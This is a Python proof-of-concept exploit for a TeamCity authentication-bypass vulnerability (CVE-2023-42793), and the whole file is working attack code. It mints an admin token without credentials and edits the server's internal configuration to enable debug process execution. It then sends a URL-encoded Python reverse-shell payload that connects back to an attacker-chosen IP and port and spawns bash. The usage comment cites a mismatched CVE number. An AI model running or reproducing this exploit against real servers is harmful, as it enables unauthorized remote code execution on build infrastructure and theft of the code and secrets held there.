import sys
import requests
import xml.etree.ElementTree as ET



def banner():
    #Print Header

    print("=============================================================================")
    print("==      ===  ==============================        ==========================")
    print("=   ==   ==  =================================  =============================")
    print("=  ====  ==  ====================  ===========  =============================")
    print("=  ========  ======   ====   ===    ==========  ======   ===  =   =  ==  = ==")
    print("=  ========    ===     ==  =  ===  ===========  =====     ==  =   =  ==     =")
    print("=  ===   ==  =  ==  =  ===  =====  ===========  =====  =  ===   =   ===  =  =")
    print("=  ====  ==  =  ==  =  ====  ====  ===========  =====  =  ===   =   ===  =  =")
    print("=   ==   ==  =  ==  =  ==  =  ===  ===========  =====  =  ==== === ====  =  =")
    print("==      ===  =  ===   ====   ====   ==========  ======   ===== === ====  =  =")
    print("=============================================================================")
    print("CVE-2023-42793 Proof of Concept - Remote Code Execution for TeamCity\n")
    

def getArguments(input_args):
    if len(input_args) != 3:
        print("Incorrect number of parameters.")
        print('Usage: "CVE-2023-42793.py [Target URL] [CallbackIP]:[CallbackPort]"')
        return None

    target_url = input_args[1]
    callback_input = input_args[2]

    # Split target URL into protocol, hostname, and port
    if target_url.startswith("http://"):
        protocol = "http://"
        target_url = target_url[len("http://"):]
    elif target_url.startswith("https://"):
        protocol = "https://"
        target_url = target_url[len("https://"):]
    else:
        print("[!] Enter a protocol handler for the target! e.g. http://[Target]:[Port]")
        exit()

    if ":" in target_url:
        target_hostname, target_port = target_url.split(":", 1)
    else:
        print("[!] Target URL not specified correctly.")
        exit()

    # Split callback input into callback IP and port
    if ":" in callback_input:
        callback_ip, callback_port = callback_input.split(":", 1)
    else:
        print("Callback IP and port not specified correctly.")
        return None

    return {
        "protocol": protocol,
        "target_hostname": target_hostname,
        "target_port": target_port,
        "callback_ip": callback_ip,
        "callback_port": callback_port
    }

    
def createAdminToken(protocol, target_hostname, target_port):
    url = f"{protocol}{target_hostname}:{target_port}/app/rest/users/id:1/tokens/RPC2"
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    print("[*] Generating Admin token...")
    response = requests.post(url, headers=headers, verify=False)
    if response.status_code == 200:
        root = ET.fromstring(response.text)
        print("[*] Admin token : "  + root.attrib.get('value', None))
        return root.attrib.get('value', None)
    else:
        print("[!] Failed to generate Admin token")
        if "Token already exists" in response.text:
            print("[!] RPC2 Token already created. Someone beat us to the punch. Tough luck")
        exit()
        
def retrieveConfigs(protocol, target_hostname, target_port, adminBearerToken):
    url = f"{protocol}{target_hostname}:{target_port}/get/file/dataDir/config/internal.properties"
    headers = {
        'Authorization': f'Bearer {adminBearerToken}',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Connection': 'close'
    }
    print("[*] Getting current TeamCity internal configurations...")
    response = requests.get(url, headers=headers, verify=False)
    if response.status_code == 200:
        print("[*] Current Configurations: " + str(response.text.strip().split('\n')))
        return response.text.strip().split('\n')
    else:
        print("[!] Failed to retrieve configurations")
        exit()

def updateConfigs(protocol, target_hostname, target_port, adminBearerToken, configItems):
    allowCodeExec = "rest.debug.processes.enable=true"
    if allowCodeExec in configItems:
        return
    
    configItems.append(allowCodeExec)
    content = "\r\n".join(configItems)
    content_encoded = content.replace("\r\n", "%0D%0A").replace("=", "%3D")
    
    url = f"{protocol}{target_hostname}:{target_port}/admin/dataDir.html?fileName=config%2Finternal.properties"
    data = f"action=edit&fileName=config%2Finternal.properties&content={content_encoded}"
    headers = {
        'Authorization': f'Bearer {adminBearerToken}',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Connection': 'close'
    }
    print("[*] Updating current TeamCity internal configurations...")
    response = requests.post(url, headers=headers, data=data, verify=False)
    if response.status_code != 200:
        print("[!] Failed to update configurations ")
        exit()
    return 

def callback(protocol, target_hostname, target_port, adminBearerToken, callback_ip, callback_port):
    url = f"{protocol}{target_hostname}:{target_port}/app/rest/debug/processes?exePath=python3&params=-cimport%20socket%2csubprocess%2cos%3bs%3dsocket.socket(socket.AF_INET%2csocket.SOCK_STREAM)%3bs.connect((%22{callback_ip}%22%2c{callback_port}))%3bos.dup2(s.fileno()%2c0)%3b%20os.dup2(s.fileno()%2c1)%3bos.dup2(s.fileno()%2c2)%3bimport%20pty%3b%20pty.spawn(%22%2fbin%2fbash%22)&idleTimeSeconds=3600"
    headers = {
        'Authorization': f'Bearer {adminBearerToken}',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Connection': 'close',
        'Content-Length': '0'
    }
    print("[*] Launching reverse shell...")
    print(f"[i] Please make sure you have a listener at interface {callback_ip} listening on port {callback_port}")
    print("[*] Press enter to launch shell...")
    input()
    response = requests.post(url, headers=headers, verify=False)

def main():
    banner()
    
    parsed_args = getArguments(sys.argv)
    if not parsed_args:
        return

    protocol = parsed_args['protocol']
    target_hostname = parsed_args['target_hostname']
    target_port = parsed_args['target_port']
    callback_ip = parsed_args['callback_ip']
    callback_port = parsed_args['callback_port']

    # Create Admin Token
    adminBearerToken = createAdminToken(protocol, target_hostname, target_port)

    # Retrieve Config Items
    configItems = retrieveConfigs(protocol, target_hostname, target_port, adminBearerToken)

    # Update Config Items
    updateConfigs(protocol, target_hostname, target_port, adminBearerToken, configItems)

    # Perform Callback
    callback(protocol, target_hostname, target_port, adminBearerToken, callback_ip, callback_port)

# Example usage:
# python CVE-2023-49723.py [https://][Target target_hostname]:[Target target_port] [CallbackIP]:[CallbackPort]

if __name__ == "__main__":
    main()
